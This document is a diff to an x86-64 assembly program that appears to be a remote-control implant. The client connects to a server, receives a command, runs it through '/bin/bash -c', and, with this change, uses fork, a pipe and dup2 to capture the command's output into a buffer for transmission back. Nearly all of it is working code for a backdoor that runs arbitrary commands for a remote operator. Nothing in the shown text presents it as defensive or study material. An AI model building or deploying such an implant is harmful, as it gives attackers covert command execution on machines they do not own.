@@ -16,17 +16,20 @@ section .data
     bash_path db "/bin/bash", 0x0           ; Path to shell
     bash_cmd_str db "-c", 0x0               ; Bash command string option
     cmd_buffer_length dq 0x0                ; Length of the cmd_buffer
-    
+    tx_buffer_length dq 0x0                 ; Length of the tx_buffer
+
 section .bss
     rx_buffer resb 0x400                    ; Receiving buffer from the server, 1KB max
     tx_buffer resb 0x400                    ; Transmitting buffer to the server, 1KB max
     cmd_buffer resb 0x100                   ; Buffer for received command
-    argv resq 0x2                           ; Argument values for execve call
+    argv resq 0x4                           ; Argument values for execve call
+    pipe_fd resq 0x2                        ; pipe file descriptors for IPC
 
 section .text
     global _start
     global fn_connect_client
     global fn_error_exit
+    global fn_exit_clean
     global fn_read_socket
     global fn_write_socket
     global fn_get_command
@@ -36,7 +39,8 @@ section .text
     global fn_parse_command
     global fn_exec_cmd
     global fn_buffer_copy
-
+    global fn_make_pipe
+    
 ; Function to exit
 fn_error_exit:
     ; Print error message
@@ -47,9 +51,17 @@ fn_error_exit:
     syscall
 
     mov rax, 0x3c               ; exit syscall
-    mov rdi, 0x1                ; Error code
+    mov rdi, 0x1                ; 1 return code
     syscall
+    ; Shoudln't be here
 
+; Function to exit clean
+fn_exit_clean:
+    mov rax, 0x3c               ; exit syscall
+    xor rdi, rdi                ; 0 return code
+    syscall
+    ; Shoudln't be here
+    
 ; Debug function to print the cmd_buffer
 fn_dbg_print_cmd_buffer:
     push rbp
@@ -57,10 +69,10 @@ fn_dbg_print_cmd_buffer:
     sub rsp, 0x8                ; Stackframe
 
     ; Write buffer to STDOUT
-    mov rax, 0x1                ; read syscall
-    mov rdi, 0x1                ; socket file descriptor
-    lea rsi, [cmd_buffer]       ; pointer to the buffer
-    mov rdx, 0x100              ; buffer size
+    mov rax, 0x1                    ; read syscall
+    mov rdi, 0x1                    ; socket file descriptor
+    lea rsi, [cmd_buffer]           ; pointer to the buffer
+    mov rdx, [cmd_buffer_length]    ; buffer size
     syscall
 
     cmp rax, 0
@@ -69,6 +81,7 @@ fn_dbg_print_cmd_buffer:
     mov rsp, rbp
     pop rbp
     ret
+
 
 ; Debug function to print the rx_buffer
 fn_dbg_print_rx_buffer:
@@ -80,6 +93,26 @@ fn_dbg_print_rx_buffer:
     mov rax, 0x1                ; read syscall
     mov rdi, 0x1                ; socket file descriptor
     lea rsi, [rx_buffer]        ; pointer to the buffer
+    mov rdx, 0x400              ; buffer size
+    syscall
+
+    cmp rax, 0
+    jl fn_error_exit            ; exit if an error occurred
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Debug function to print the tx_buffer
+fn_dbg_print_tx_buffer:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    ; Write buffer to STDOUT
+    mov rax, 0x1                ; read syscall
+    mov rdi, 0x1                ; socket file descriptor
+    lea rsi, [tx_buffer]        ; pointer to the buffer
     mov rdx, 0x400              ; buffer size
     syscall
 
@@ -133,11 +166,77 @@ fn_buffer_copy:
     pop rbp
     ret
 
-; Function to execute a command in /bin/bash using execve
+; Function to create a pipe for child process
+; Return values:
+; pipe_fd[0] - reading, parent process end
+; pipe_fd[1] - writing, child process end
+fn_make_pipe:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x8                ; Stackframe
+
+    mov rax, 0x16               ; pipe syscall
+    lea rdi, [pipe_fd]          ; Load address of int pipe_fd[2]
+    syscall
+
+    cmp rax, 0x0                ; Error checking
+    jl fn_error_exit
+
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Function that spawns a child process through fork syscall.
+; Child executes command through execve syscall
+; Pipes STDOUT of child process through to parent process
 fn_exec_cmd:
     push rbp
     mov rbp, rsp
-    sub rsp, 0x28                ; Stackframe
+    sub rsp, 0x10               ; Stackframe
+
+    ; Creates the pipe
+    call fn_make_pipe
+
+    ; Call fork to split into child and parent processes
+    mov rax, 0x39               ; fork syscall
+    syscall
+
+    cmp rax, 0x0
+    je .child_process_branch    ; rc = 0, child
+    jg .parent_process_branch   ; rc > 0, PID of child, parent
+    jmp fn_error_exit           ; rc < 0, error
+    
+.parent_process_branch:
+
+    ; Sleep for 50ms to avoid synchronization problems
+    call fn_sleep_ns
+
+    ; Use ioctl to get number of bytes available
+    mov rax, 0x10               ; ioctl syscall
+    mov rdi, qword [pipe_fd]    ; pipe_fd[0]
+    mov rsi, 0x541B             ; FIONREAD command
+    lea rdx, [rsp+8]            ; Pointer to result buffer
+    syscall
+
+    mov rdx, qword [rsp+8]      ; Copy number of bytes available from stack into rdx
+
+    ; Read that much bytes
+    xor rax, rax                ; read syscall
+    mov rdi, qword [pipe_fd]    ; pipe_fd[0]
+    lea rsi, [tx_buffer]        ; Load address of transmit buffer
+    ; byte count already in rdx
+    syscall
+
+    ; Jump to return
+    jmp .return
+.child_process_branch:
+
+    ; Use dup2 to redirect STDOUT to pipe
+    ; After this call, execve output will be redirected to pipe
+    mov rax, 0x3f               ; dup2 syscall
+    mov rdi, 0x1                ; oldfd = 1 (STDOUT)
+    mov rsi, [pipe_fd+8]        ; newfd = pipe_fd[1]
+    syscall
 
     ; argv loading
     lea rdi, [bash_path]        ; argv[0] = /bin/bash
@@ -148,13 +247,20 @@ fn_exec_cmd:
     mov [argv+16], rdi
     xor rdi, rdi                ; argv[3] = NULL
     mov [argv+24], rdi
-    
+
     mov rax, 0x3b               ; execve syscall
     lea rdi, [bash_path]        ; char *filename
     lea rsi, [argv]             ; char *argv
     mov rdx, 0x0                ; char *envp
     syscall
 
+    ; Sleep for 50ms to avoid synchronization problems
+    call fn_sleep_ns
+
+    ; Exit cleanly now
+    call fn_exit_clean
+
+.return:
     mov rsp, rbp
     pop rbp
     ret
@@ -227,7 +333,8 @@ fn_parse_command:
     pop rbp
     ret
 
-; Function to sleep to avoid http server being too slow
+; Function to sleep to avoid synchronization problems
+; Default time is 50ms
 fn_sleep_ns:
     push rbp
     mov rbp, rsp
@@ -428,11 +535,11 @@ _start:
     call fn_get_command
 
     ;call fn_dbg_print_rx_buffer
-    call fn_dbg_print_cmd_buffer
+    ;call fn_dbg_print_cmd_buffer
 
     ; Execute command in bash
     call fn_exec_cmd
-
+    ;call fn_dbg_print_tx_buffer
     ; Exit the program
     mov rax, 0x3c               ; exit syscall
     mov rdi, 0x0
